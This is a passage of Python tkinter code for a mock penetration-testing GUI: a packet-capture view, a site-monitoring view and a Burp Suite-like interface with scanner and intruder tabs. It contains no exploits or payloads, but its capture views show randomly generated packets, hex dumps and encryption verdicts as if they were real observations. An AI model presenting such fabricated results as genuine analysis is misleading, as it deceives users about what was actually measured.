        # Apply button
        ttk.Button(filter_window, text="Apply Filter", 
                  command=lambda: self.apply_network_filter(filter_var.get())).pack(pady=20)
    
    def apply_network_filter(self, filter_expr):
        self.log_activity(f"Applied network filter: {filter_expr}")
        # In a real implementation, this would apply the filter to the capture
        
    def network_capture_worker(self):
        import time
        import random
        
        # Simulate packet capture
        protocols = ["802.11", "TCP", "UDP", "ARP", "DNS", "HTTP", "HTTPS"]
        sources = ["192.168.1.100", "10.0.0.50", "172.16.0.25", "192.168.1.1"]
        destinations = ["192.168.1.1", "8.8.8.8", "1.1.1.1", "192.168.1.100"]
        
        while self.network_capture_active:
            try:
                # Simulate capturing a packet
                time.sleep(random.uniform(0.1, 0.5))  # Random delay to simulate real capture
                
                if self.network_capture_active:
                    self.packet_counter += 1
                    
                    # Generate random packet data
                    protocol = random.choice(protocols)
                    source = random.choice(sources)
                    destination = random.choice(destinations)
                    length = random.randint(60, 1500)  # Typical packet sizes
                    
                    # Create packet info based on protocol
                    if protocol == "HTTP":
                        info = f"GET /index.html HTTP/1.1"
                    elif protocol == "DNS":
                        info = f"Standard query A {random.choice(['google.com', 'facebook.com', 'github.com'])}"
                    elif protocol == "802.11":
                        info = f"802.11 Data, SSID: {random.choice(['HomeWiFi', 'GuestNet', 'OfficeWiFi'])}"
                    else:
                        info = f"{protocol} packet from {source} to {destination}"
                    
                    # Insert packet into the tree
                    self.root.after(0, lambda: self.add_network_packet(
                        self.packet_counter,
                        time.strftime('%H:%M:%S'),
                        source,
                        destination,
                        protocol,
                        length,
                        info
                    ))
            except Exception as e:
                self.root.after(0, lambda err=str(e): self.log_activity(f"Network capture error: {err}"))
                time.sleep(1)  # Wait before retrying
    
    def add_network_packet(self, packet_no, time_str, source, destination, protocol, length, info):
        # Add a packet to the treeview
        try:
            self.packets_tree.insert('', 'end', values=(
                packet_no, time_str, source, destination, protocol, length, info
            ))
            
            # Auto-scroll to the latest packet
            self.packets_tree.see(self.packets_tree.get_children()[-1])
        except tk.TclError:
            # Handle case where GUI element is destroyed
            pass
        except Exception:
            # Handle any other exceptions
            pass
    
    def show_packet_details(self, event):
        # Show detailed packet information when a packet is selected
        selected_item = self.packets_tree.selection()
        if selected_item:
            item_values = self.packets_tree.item(selected_item[0], 'values')
            if item_values:
                # Clear previous details
                self.packet_details_text.delete(1.0, tk.END)
                
                # Generate detailed packet information
                packet_no, time_str, source, destination, protocol, length, info = item_values
                
                # Create detailed packet information
                details = f"""Packet Details:

Packet Number: {packet_no}
Time: {time_str}
Protocol: {protocol}
Length: {length} bytes

Frame Information:
- Source: {source}
- Destination: {destination}
- Info: {info}

Raw Data:
0000   00 11 22 33 44 55 66 77 88 99 aa bb cc dd ee ff   .."3D.Ufw........
0010   00 11 22 33 44 55 66 77 88 99 aa bb cc dd ee ff   .."3D.Ufw........
0020   00 11 22 33 44 55 66 77 88 99 aa bb cc dd ee ff   .."3D.Ufw........

Additional Analysis:
- Protocol Analysis: {protocol} protocol detected
- Traffic Type: Network traffic between {source} and {destination}
- Security: {random.choice(['Encrypted', 'Unencrypted', 'Partially Encrypted'])}
"""
                
                self.packet_details_text.insert(tk.END, details)
    
    def start_site_network_monitoring(self):
        target = self.site_networks_target.get().strip()
        if not target:
            messagebox.showwarning("Warning", "Please enter a target IP address or URL")
            return
        
        # Validate target format
        if not (target.startswith(('http://', 'https://')) or self.is_valid_ip(target)):
            # If it's not a URL or IP, try to format it as a URL
            if '.' in target:  # Likely a domain
                target = 'http://' + target
        
        self.site_networks_target.set(target)
        self.site_network_monitoring_active = True
        self.site_packet_counter = 0
        
        # Clear previous logs
        for item in self.site_packets_tree.get_children():
            self.site_packets_tree.delete(item)
        self.site_packet_details_text.delete(1.0, tk.END)
        
        # Start monitoring in a separate thread
        self.site_network_monitoring_thread = threading.Thread(target=self.site_network_monitoring_worker, args=(target,), daemon=True)
        self.site_network_monitoring_thread.start()
        
        self.log_activity(f"Started site network monitoring for: {target}")
    
    def stop_site_network_monitoring(self):
        self.site_network_monitoring_active = False
        self.log_activity("Stopped site network monitoring")
    
    def clear_site_network_logs(self):
        # Clear the packets tree
        for item in self.site_packets_tree.get_children():
            self.site_packets_tree.delete(item)
        
        # Clear packet details
        self.site_packet_details_text.delete(1.0, tk.END)
        
        self.site_packet_counter = 0
        self.log_activity("Cleared site network logs")
    
    def site_network_monitoring_worker(self, target):
        import time
        import random
        from urllib.parse import urlparse
        
        # Extract domain/IP from target
        if target.startswith(('http://', 'https://')):
            parsed = urlparse(target)
            target_host = parsed.netloc
        else:
            target_host = target
        
        # Simulate network traffic for the target
        protocols = ["TCP", "UDP", "HTTP", "HTTPS", "DNS", "ARP"]
        sources = [target_host, "192.168.1.1", "192.168.1.100", "8.8.8.8"]
        destinations = [target_host, "192.168.1.1", "192.168.1.100", "8.8.8.8"]
        
        while self.site_network_monitoring_active:
            try:
                # Simulate capturing a packet
                time.sleep(random.uniform(0.1, 0.5))  # Random delay to simulate real capture
                
                if self.site_network_monitoring_active:
                    self.site_packet_counter += 1
                    
                    # Generate random packet data
                    protocol = random.choice(protocols)
                    # Ensure one of the addresses is the target
                    if random.choice([True, False]):
                        source = target_host
                        destination = random.choice([ip for ip in destinations if ip != target_host])
                    else:
                        source = random.choice([ip for ip in sources if ip != target_host])
                        destination = target_host
                    length = random.randint(60, 1500)  # Typical packet sizes
                    
                    # Create packet info based on protocol
                    if protocol == "HTTP":
                        info = f"GET /index.html HTTP/1.1"
                    elif protocol == "HTTPS":
                        info = f"TLS Client Hello to {target_host}"
                    elif protocol == "DNS":
                        info = f"Standard query A {target_host}"
                    else:
                        info = f"{protocol} packet between {source} and {destination}"
                    
                    # Insert packet into the tree
                    self.root.after(0, lambda: self.add_site_network_packet(
                        self.site_packet_counter,
                        time.strftime('%H:%M:%S'),
                        source,
                        destination,
                        protocol,
                        length,
                        info
                    ))
            except Exception as e:
                self.root.after(0, lambda err=str(e): self.log_activity(f"Site network monitoring error: {err}"))
                time.sleep(1)  # Wait before retrying
    
    def add_site_network_packet(self, packet_no, time_str, source, destination, protocol, length, info):
        # Add a packet to the site networks treeview
        try:
            self.site_packets_tree.insert('', 'end', values=(
                packet_no, time_str, source, destination, protocol, length, info
            ))
            
            # Auto-scroll to the latest packet
            self.site_packets_tree.see(self.site_packets_tree.get_children()[-1])
        except tk.TclError:
            # Handle case where GUI element is destroyed
            pass
        except Exception:
            # Handle any other exceptions
            pass
    
    def show_site_packet_details(self, event):
        # Show detailed packet information when a site network packet is selected
        selected_item = self.site_packets_tree.selection()
        if selected_item:
            item_values = self.site_packets_tree.item(selected_item[0], 'values')
            if item_values:
                # Clear previous details
                self.site_packet_details_text.delete(1.0, tk.END)
                
                # Generate detailed packet information
                packet_no, time_str, source, destination, protocol, length, info = item_values
                
                # Create detailed packet information
                details = f"""Site Network Packet Details:

Packet Number: {packet_no}
Time: {time_str}
Protocol: {protocol}
Length: {length} bytes

Frame Information:
- Source: {source}
- Destination: {destination}
- Info: {info}

Raw Data:
0000   00 11 22 33 44 55 66 77 88 99 aa bb cc dd ee ff   .."3D.Ufw........
0010   00 11 22 33 44 55 66 77 88 99 aa bb cc dd ee ff   .."3D.Ufw........
0020   00 11 22 33 44 55 66 77 88 99 aa bb cc dd ee ff   .."3D.Ufw........

Additional Analysis:
- Protocol Analysis: {protocol} protocol detected
- Traffic Type: Network traffic between {source} and {destination}
- Security: {random.choice(['Encrypted', 'Unencrypted', 'Partially Encrypted'])}
- Target Analysis: This packet is related to target {source if source != destination else destination}
"""
                
                self.site_packet_details_text.insert(tk.END, details)
    
    def is_valid_ip(self, ip):
        # Check if the given string is a valid IP address
        try:
            parts = ip.split('.')
            if len(parts) != 4:
                return False
            for part in parts:
                if not 0 <= int(part) <= 255:
                    return False
            return True
        except ValueError:
            return False
    
    def create_burp_suite_ui(self):
        # Create a professional Burp Suite-like interface
        burp_main_frame = ttk.Frame(self.burp_suite_frame)
        burp_main_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Top toolbar with all Burp Suite functionality
        toolbar = ttk.Frame(burp_main_frame)
        toolbar.pack(fill=tk.X, padx=5, pady=5)
        
        # Language selection
        ttk.Label(toolbar, text="Language:", font=("Arial", 10)).pack(side=tk.LEFT, padx=(0, 5))
        self.burp_language_var = tk.StringVar(value="Python")
        language_combo = ttk.Combobox(toolbar, textvariable=self.burp_language_var, values=["Python", "C#", "C++"], state="readonly", width=10)
        language_combo.pack(side=tk.LEFT, padx=(0, 10))
        
        # Main Burp Suite tools
        ttk.Button(toolbar, text="Proxy", command=self.burp_proxy).pack(side=tk.LEFT, padx=2)
        ttk.Button(toolbar, text="Target", command=self.burp_target).pack(side=tk.LEFT, padx=2)
        ttk.Button(toolbar, text="Intruder", command=self.burp_intruder).pack(side=tk.LEFT, padx=2)
        ttk.Button(toolbar, text="Sequencer", command=self.burp_sequencer).pack(side=tk.LEFT, padx=2)
        ttk.Button(toolbar, text="Comparer", command=self.burp_comparer).pack(side=tk.LEFT, padx=2)
        ttk.Button(toolbar, text="Logger", command=self.burp_logger).pack(side=tk.LEFT, padx=2)
        ttk.Button(toolbar, text="Extender", command=self.burp_extender).pack(side=tk.LEFT, padx=2)
        ttk.Button(toolbar, text="Scanner", command=self.burp_scanner).pack(side=tk.LEFT, padx=2)
        
        # Main content area with professional notebook
        burp_notebook = ttk.Notebook(burp_main_frame)
        burp_notebook.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Proxy tab with professional features
        proxy_frame = ttk.Frame(burp_notebook)
        burp_notebook.add(proxy_frame, text="Proxy")
        
        # Proxy controls
        proxy_controls = ttk.Frame(proxy_frame)
        proxy_controls.pack(fill=tk.X, padx=5, pady=5)
        
        self.proxy_intercept_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(proxy_controls, text="Intercept is ON", variable=self.proxy_intercept_var).pack(side=tk.LEFT, padx=5)
        ttk.Button(proxy_controls, text="Pause", command=self.burp_proxy_pause).pack(side=tk.LEFT, padx=5)
        ttk.Button(proxy_controls, text="Clear", command=self.burp_proxy_clear).pack(side=tk.LEFT, padx=5)
        
        # Proxy content
        proxy_content = ttk.Frame(proxy_frame)
        proxy_content.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Request/Response split
        proxy_paned = tk.PanedWindow(proxy_content, orient=tk.HORIZONTAL)
        proxy_paned.pack(fill=tk.BOTH, expand=True)
        
        # Proxy request panel
        proxy_request_frame = ttk.LabelFrame(proxy_paned, text="Request")
        proxy_request_text = scrolledtext.ScrolledText(proxy_request_frame, height=15, font=("Consolas", 9))
        proxy_request_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        proxy_paned.add(proxy_request_frame)
        
        # Proxy response panel
        proxy_response_frame = ttk.LabelFrame(proxy_paned, text="Response")
        proxy_response_text = scrolledtext.ScrolledText(proxy_response_frame, height=15, font=("Consolas", 9))
        proxy_response_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        proxy_paned.add(proxy_response_frame)
        
        # Store references
        self.proxy_request_text = proxy_request_text
        self.proxy_response_text = proxy_response_text
        
        # Target tab
        target_frame = ttk.Frame(burp_notebook)
        burp_notebook.add(target_frame, text="Target")
        
        # Target controls
        target_controls = ttk.Frame(target_frame)
        target_controls.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(target_controls, text="Base URL:").pack(side=tk.LEFT, padx=(0, 5))
        self.target_base_url = ttk.Entry(target_controls, width=40)
        self.target_base_url.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        ttk.Button(target_controls, text="Spider", command=self.burp_target_spider).pack(side=tk.LEFT, padx=2)
        ttk.Button(target_controls, text="Scan", command=self.burp_target_scan).pack(side=tk.LEFT, padx=2)
        
        # Target content
        target_content = ttk.Frame(target_frame)
        target_content.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Target site map
        target_paned = tk.PanedWindow(target_content, orient=tk.HORIZONTAL)
        target_paned.pack(fill=tk.BOTH, expand=True)
        
        # Site tree
        site_tree_frame = ttk.LabelFrame(target_paned, text="Site Map")
        self.target_site_tree = ttk.Treeview(site_tree_frame, columns=('Method', 'Status', 'Length'), show='tree headings')
        self.target_site_tree.heading('#0', text='URL')
        self.target_site_tree.heading('Method', text='Method')
        self.target_site_tree.heading('Status', text='Status')
        self.target_site_tree.heading('Length', text='Length')
        self.target_site_tree.column('#0', width=200)
        self.target_site_tree.column('Method', width=80)
        self.target_site_tree.column('Status', width=80)
        self.target_site_tree.column('Length', width=80)
        
        # Scrollbars
        site_tree_scroll = ttk.Scrollbar(site_tree_frame, orient=tk.VERTICAL, command=self.target_site_tree.yview)
        self.target_site_tree.configure(yscrollcommand=site_tree_scroll.set)
        
        self.target_site_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5, pady=5)
        site_tree_scroll.pack(side=tk.RIGHT, fill=tk.Y, pady=5)
        target_paned.add(site_tree_frame)
        
        # Target request/response
        target_request_frame = ttk.LabelFrame(target_paned, text="Request/Response")
        target_request_text = scrolledtext.ScrolledText(target_request_frame, height=15, font=("Consolas", 9))
        target_request_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        target_paned.add(target_request_frame)
        
        # Store references
        self.target_request_text = target_request_text
        
        # Intruder tab
        intruder_frame = ttk.Frame(burp_notebook)
        burp_notebook.add(intruder_frame, text="Intruder")
        
        # Intruder controls
        intruder_controls = ttk.Frame(intruder_frame)
        intruder_controls.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Button(intruder_controls, text="Add", command=self.burp_intruder_add).pack(side=tk.LEFT, padx=2)
        ttk.Button(intruder_controls, text="Clear", command=self.burp_intruder_clear).pack(side=tk.LEFT, padx=2)
        ttk.Button(intruder_controls, text="Start Attack", command=self.burp_intruder_start).pack(side=tk.LEFT, padx=5)
        ttk.Button(intruder_controls, text="Pause", command=self.burp_intruder_pause).pack(side=tk.LEFT, padx=2)
        
        # Intruder content
        intruder_content = ttk.Frame(intruder_frame)
        intruder_content.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Intruder request/response split
        intruder_paned = tk.PanedWindow(intruder_content, orient=tk.HORIZONTAL)
        intruder_paned.pack(fill=tk.BOTH, expand=True)
        
        # Intruder request
        intruder_request_frame = ttk.LabelFrame(intruder_paned, text="Request")
        intruder_request_text = scrolledtext.ScrolledText(intruder_request_frame, height=15, font=("Consolas", 9))
        intruder_request_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        intruder_paned.add(intruder_request_frame)
        
        # Intruder results
        intruder_results_frame = ttk.LabelFrame(intruder_paned, text="Results")
        intruder_results_text = scrolledtext.ScrolledText(intruder_results_frame, height=15, font=("Consolas", 9))
        intruder_results_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        intruder_paned.add(intruder_results_frame)
        
        # Store references
        self.intruder_request_text = intruder_request_text
        self.intruder_results_text = intruder_results_text
        
        # Sequencer tab
        sequencer_frame = ttk.Frame(burp_notebook)
        burp_notebook.add(sequencer_frame, text="Sequencer")
        
        # Sequencer controls
        sequencer_controls = ttk.Frame(sequencer_frame)
        sequencer_controls.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Button(sequencer_controls, text="Start Capture", command=self.burp_sequencer_start_capture).pack(side=tk.LEFT, padx=2)
        ttk.Button(sequencer_controls, text="Stop Capture", command=self.burp_sequencer_stop_capture).pack(side=tk.LEFT, padx=2)
        ttk.Button(sequencer_controls, text="Analyze", command=self.burp_sequencer_analyze).pack(side=tk.LEFT, padx=2)
        ttk.Button(sequencer_controls, text="Clear", command=self.burp_sequencer_clear).pack(side=tk.LEFT, padx=2)
        
        # Sequencer content
        sequencer_content = ttk.Frame(sequencer_frame)
        sequencer_content.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Sequencer request/response split
        sequencer_paned = tk.PanedWindow(sequencer_content, orient=tk.HORIZONTAL)
        sequencer_paned.pack(fill=tk.BOTH, expand=True)
        
        # Sequencer tokens list
        tokens_frame = ttk.LabelFrame(sequencer_paned, text="Captured Tokens")
        self.sequencer_tokens_list = tk.Listbox(tokens_frame)
        tokens_scrollbar = ttk.Scrollbar(tokens_frame, orient=tk.VERTICAL, command=self.sequencer_tokens_list.yview)
        self.sequencer_tokens_list.configure(yscrollcommand=tokens_scrollbar.set)
        
        self.sequencer_tokens_list.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5, pady=5)
        tokens_scrollbar.pack(side=tk.RIGHT, fill=tk.Y, pady=5)
        sequencer_paned.add(tokens_frame)
        
        # Sequencer analysis
        analysis_frame = ttk.LabelFrame(sequencer_paned, text="Analysis Results")
        sequencer_analysis_text = scrolledtext.ScrolledText(analysis_frame, height=10, font=("Consolas", 9))
        sequencer_analysis_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        sequencer_analysis_text.insert(tk.END, "Sequencer Analysis Results\n")
        sequencer_paned.add(analysis_frame)
        
        # Store references
        self.sequencer_analysis_text = sequencer_analysis_text
        
        # Comparer tab
        comparer_frame = ttk.Frame(burp_notebook)
        burp_notebook.add(comparer_frame, text="Comparer")
        
        # Comparer controls
        comparer_controls = ttk.Frame(comparer_frame)
        comparer_controls.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Button(comparer_controls, text="Compare", command=self.burp_comparer_compare).pack(side=tk.LEFT, padx=2)
        ttk.Button(comparer_controls, text="Clear", command=self.burp_comparer_clear).pack(side=tk.LEFT, padx=2)
        
        # Comparer content
        comparer_content = ttk.Frame(comparer_frame)
        comparer_content.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Create a paned window to split the UI
        comparer_paned = tk.PanedWindow(comparer_content, orient=tk.HORIZONTAL)
        comparer_paned.pack(fill=tk.BOTH, expand=True)
        
        # Left panel for first response
        left_frame = ttk.LabelFrame(comparer_paned, text="Response 1")
        self.comparer_left_text = scrolledtext.ScrolledText(left_frame, height=15, font=("Consolas", 9))
        left_scrollbar = ttk.Scrollbar(left_frame, orient=tk.VERTICAL, command=self.comparer_left_text.yview)
        self.comparer_left_text.configure(yscrollcommand=left_scrollbar.set)
        
        self.comparer_left_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5, pady=5)
        left_scrollbar.pack(side=tk.RIGHT, fill=tk.Y, pady=5)
        
        # Right panel for second response
        right_frame = ttk.LabelFrame(comparer_paned, text="Response 2")
        self.comparer_right_text = scrolledtext.ScrolledText(right_frame, height=15, font=("Consolas", 9))
        right_scrollbar = ttk.Scrollbar(right_frame, orient=tk.VERTICAL, command=self.comparer_right_text.yview)
        self.comparer_right_text.configure(yscrollcommand=right_scrollbar.set)
        
        self.comparer_right_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5, pady=5)
        right_scrollbar.pack(side=tk.RIGHT, fill=tk.Y, pady=5)
        
        # Add frames to paned window
        comparer_paned.add(left_frame)
        comparer_paned.add(right_frame)
        
        # Results panel
        results_frame = ttk.LabelFrame(comparer_frame, text="Comparison Results")
        self.comparer_results_text = scrolledtext.ScrolledText(results_frame, height=8, font=("Consolas", 9))
        results_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Store references
        self.comparer_left_text = self.comparer_left_text
        self.comparer_right_text = self.comparer_right_text
        self.comparer_results_text = self.comparer_results_text
        
        # Logger tab
        logger_frame = ttk.Frame(burp_notebook)
        burp_notebook.add(logger_frame, text="Logger")
        
        # Logger controls
        logger_controls = ttk.Frame(logger_frame)
        logger_controls.pack(fill=tk.X, padx=5, pady=5)
        
        self.logger_intercept_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(logger_controls, text="Logging ON", variable=self.logger_intercept_var).pack(side=tk.LEFT, padx=5)
        ttk.Button(logger_controls, text="Clear", command=self.burp_logger_clear).pack(side=tk.LEFT, padx=2)
        ttk.Button(logger_controls, text="Export", command=self.burp_logger_export).pack(side=tk.LEFT, padx=2)
        
        # Logger content
        logger_content = ttk.Frame(logger_frame)
        logger_content.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Logger treeview
        columns = ("No", "Time", "Method", "URL", "Status", "Length", "MIME Type", "Comment")
        self.logger_tree = ttk.Treeview(logger_content, columns=columns, show='headings', height=15)
        
        # Define headings
        for col in columns:
            self.logger_tree.heading(col, text=col)
            if col == "No":
                self.logger_tree.column(col, width=50)
            elif col == "Time":
                self.logger_tree.column(col, width=100)
            elif col == "Method":
                self.logger_tree.column(col, width=80)
            elif col == "URL":
                self.logger_tree.column(col, width=250)
            elif col == "Status":
                self.logger_tree.column(col, width=70)
            elif col == "Length":
                self.logger_tree.column(col, width=70)
            elif col == "MIME Type":
                self.logger_tree.column(col, width=120)
            elif col == "Comment":
                self.logger_tree.column(col, width=150)
        
        # Scrollbars for logger tree
        logger_v_scrollbar = ttk.Scrollbar(logger_content, orient=tk.VERTICAL, command=self.logger_tree.yview)
        logger_h_scrollbar = ttk.Scrollbar(logger_content, orient=tk.HORIZONTAL, command=self.logger_tree.xview)
        self.logger_tree.configure(yscrollcommand=logger_v_scrollbar.set, xscrollcommand=logger_h_scrollbar.set)
        
        # Pack logger elements
        self.logger_tree.grid(row=0, column=0, sticky='nsew')
        logger_v_scrollbar.grid(row=0, column=1, sticky='ns')
        logger_h_scrollbar.grid(row=1, column=0, sticky='ew')
        
        logger_content.grid_rowconfigure(0, weight=1)
        logger_content.grid_columnconfigure(0, weight=1)
        
        # Store references
        self.logger_tree = self.logger_tree
        
        # Bind selection event to show request details
        self.logger_tree.bind('<<TreeviewSelect>>', self.show_logger_request_details)
        
        # Extender tab
        extender_frame = ttk.Frame(burp_notebook)
        burp_notebook.add(extender_frame, text="Extender")
        
        # Extender controls
        extender_controls = ttk.Frame(extender_frame)
        extender_controls.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Button(extender_controls, text="Load Extension", command=self.burp_extender_load).pack(side=tk.LEFT, padx=2)
        ttk.Button(extender_controls, text="Unload Extension", command=self.burp_extender_unload).pack(side=tk.LEFT, padx=2)
        ttk.Button(extender_controls, text="Clear", command=self.burp_extender_clear).pack(side=tk.LEFT, padx=2)
        
        # Extender content
        extender_content = ttk.Frame(extender_frame)
        extender_content.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Create a paned window to split the UI
        extender_paned = tk.PanedWindow(extender_content, orient=tk.HORIZONTAL)
        extender_paned.pack(fill=tk.BOTH, expand=True)
        
        # Extensions list
        ext_list_frame = ttk.LabelFrame(extender_paned, text="Loaded Extensions")
        self.extender_extensions_list = ttk.Treeview(ext_list_frame, columns=("Name", "Version", "Status"), show='headings')
        
        # Define headings
        self.extender_extensions_list.heading("Name", text="Name")
        self.extender_extensions_list.heading("Version", text="Version")
        self.extender_extensions_list.heading("Status", text="Status")
        self.extender_extensions_list.column("Name", width=150)
        self.extender_extensions_list.column("Version", width=100)
        self.extender_extensions_list.column("Status", width=100)
        
        # Add sample extensions
        self.extender_extensions_list.insert('', 'end', values=("SQLi Scanner", "1.0.0", "Loaded"))
        self.extender_extensions_list.insert('', 'end', values=("XSS Detector", "1.2.1", "Loaded"))
        self.extender_extensions_list.insert('', 'end', values=("Protocol Handler", "0.9.5", "Loaded"))
        
        ext_list_scrollbar = ttk.Scrollbar(ext_list_frame, orient=tk.VERTICAL, command=self.extender_extensions_list.yview)
        self.extender_extensions_list.configure(yscrollcommand=ext_list_scrollbar.set)
        
        self.extender_extensions_list.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5, pady=5)
        ext_list_scrollbar.pack(side=tk.RIGHT, fill=tk.Y, pady=5)
        
        # Extension details
        ext_details_frame = ttk.LabelFrame(extender_paned, text="Extension Details")
        ext_details_text = scrolledtext.ScrolledText(ext_details_frame, height=15, font=("Consolas", 9))
        ext_details_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        ext_details_text.insert(tk.END, "Select an extension to view details\n")
        
        # Add frames to paned window
        extender_paned.add(ext_list_frame)
        extender_paned.add(ext_details_frame)
        
        # Store references
        self.extender_extensions_list = self.extender_extensions_list
        self.extender_details_text = ext_details_text
        
        # Bind selection event to show extension details
        self.extender_extensions_list.bind('<<TreeviewSelect>>', self.show_extender_extension_details)
        
        # Scanner tab
        scanner_frame = ttk.Frame(burp_notebook)
        burp_notebook.add(scanner_frame, text="Scanner")
        
        # Scanner controls
        scanner_controls = ttk.Frame(scanner_frame)
        scanner_controls.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(scanner_controls, text="Target:", font=("Arial", 10)).pack(side=tk.LEFT, padx=(0, 5))
        self.scanner_target_url = tk.StringVar()
        target_entry = ttk.Entry(scanner_controls, textvariable=self.scanner_target_url, width=40)
        target_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 10))
        
        ttk.Button(scanner_controls, text="Start Scan", command=self.burp_scanner_start).pack(side=tk.LEFT, padx=2)
        ttk.Button(scanner_controls, text="Stop Scan", command=self.burp_scanner_stop).pack(side=tk.LEFT, padx=2)
        ttk.Button(scanner_controls, text="Clear", command=self.burp_scanner_clear).pack(side=tk.LEFT, padx=2)
        
        # Scanner content
        scanner_content = ttk.Frame(scanner_frame)
        scanner_content.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Create a paned window to split the UI
        scanner_paned = tk.PanedWindow(scanner_content, orient=tk.HORIZONTAL)
        scanner_paned.pack(fill=tk.BOTH, expand=True)
        
        # Scanner issues list
        issues_frame = ttk.LabelFrame(scanner_paned, text="Scan Issues")
        
        # Scanner treeview
        columns = ("Severity", "Name", "Location", "Vulnerability Class", "Status")
        self.scanner_tree = ttk.Treeview(issues_frame, columns=columns, show='headings', height=15)
        
        # Define headings
        for col in columns:
            self.scanner_tree.heading(col, text=col)
            if col == "Severity":
                self.scanner_tree.column(col, width=100)
            elif col == "Name":
                self.scanner_tree.column(col, width=200)
            elif col == "Location":
                self.scanner_tree.column(col, width=250)
            elif col == "Vulnerability Class":
                self.scanner_tree.column(col, width=150)
            elif col == "Status":
                self.scanner_tree.column(col, width=100)
        
        # Add sample scan results
        self.scanner_tree.insert('', 'end', values=("High", "SQL Injection", "/login.php", "SQL Injection", "Unconfirmed"))
        self.scanner_tree.insert('', 'end', values=("Medium", "XSS", "/search.php?q=test", "Cross-site Scripting", "Unconfirmed"))
        self.scanner_tree.insert('', 'end', values=("Low", "Information Disclosure", "/api/users", "Information Exposure", "Unconfirmed"))
        
        issues_scrollbar = ttk.Scrollbar(issues_frame, orient=tk.VERTICAL, command=self.scanner_tree.yview)
        self.scanner_tree.configure(yscrollcommand=issues_scrollbar.set)
        
        self.scanner_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5, pady=5)
        issues_scrollbar.pack(side=tk.RIGHT, fill=tk.Y, pady=5)
        
        # Scanner details
        details_frame = ttk.LabelFrame(scanner_paned, text="Issue Details")
        scanner_details_text = scrolledtext.ScrolledText(details_frame, height=15, font=("Consolas", 9))
        scanner_details_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        scanner_details_text.insert(tk.END, "Select an issue to view details\n")
        
        # Add frames to paned window
        scanner_paned.add(issues_frame)
        scanner_paned.add(details_frame)
        
        # Store references
        self.scanner_tree = self.scanner_tree
        self.scanner_details_text = scanner_details_text
                
        # Bind selection event to show issue details
        self.scanner_tree.bind('<<TreeviewSelect>>', self.show_scanner_issue_details)
                
        # Title
        title_label = ttk.Label(burp_main_frame, text="Glitch-Burp-V2 Professional", font=("Arial", 16, "bold"))
        title_label.pack(pady=10)
        
        # Add language-specific functionality buttons
        lang_func_frame = ttk.Frame(burp_main_frame)
        lang_func_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Button(lang_func_frame, text="Generate HTTP Request Code", command=self.burp_generate_http_code).pack(side=tk.LEFT, padx=2)
        ttk.Button(lang_func_frame, text="Generate Payload Test Code", command=self.burp_generate_payload_code).pack(side=tk.LEFT, padx=2)
        ttk.Button(lang_func_frame, text="Export to Selected Language", command=self.burp_export_language).pack(side=tk.LEFT, padx=2)
    
    def burp_proxy(self):
        # Toggle proxy interception
        if hasattr(self, 'proxy_intercept_var'):
            current_state = self.proxy_intercept_var.get()
            self.proxy_intercept_var.set(not current_state)
            state_text = "ON" if not current_state else "OFF"
            self.log_activity(f"Proxy interception turned {state_text}")
        else:
            messagebox.showinfo("Glitch-Burp-V2", "Proxy functionality would be implemented here")
    
    def burp_proxy_pause(self):
        self.log_activity("Proxy paused")
    
    def burp_proxy_clear(self):
        if hasattr(self, 'proxy_request_text'):
            self.proxy_request_text.delete(1.0, tk.END)
        if hasattr(self, 'proxy_response_text'):
            self.proxy_response_text.delete(1.0, tk.END)
        self.log_activity("Proxy cleared")
    
    def burp_target(self):
        self.log_activity("Target tab accessed")
    
    def burp_target_spider(self):
        target_url = self.target_base_url.get().strip()
        if not target_url:
            # Try to get URL from the site map tree if no URL is in the input field
            selected_item = self.target_site_tree.selection()
            if selected_item:
                item_values = self.target_site_tree.item(selected_item[0], 'values')
                if item_values and len(item_values) > 0:
                    target_url = item_values[0]
                else:
                    # Get URL from the text of the tree item
                    target_url = self.target_site_tree.item(selected_item[0], 'text')
            else:
                messagebox.showwarning("Warning", "Please enter a target URL or select one from the site map")
                return
        
        # Start spidering in a separate thread
        threading.Thread(target=self._burp_target_spider_thread, args=(target_url,), daemon=True).start()
        self.log_activity(f"Started spidering: {target_url}")
    
    def _burp_target_spider_thread(self, url):
        # Simulate spidering process
        try:
            # Add to site tree
            if url.startswith('http'):
                domain = urlparse(url).netloc
                
                # Add domain node
                domain_id = self.target_site_tree.insert('', 'end', text=domain, values=('', '', ''))
                
                # Add some sample paths
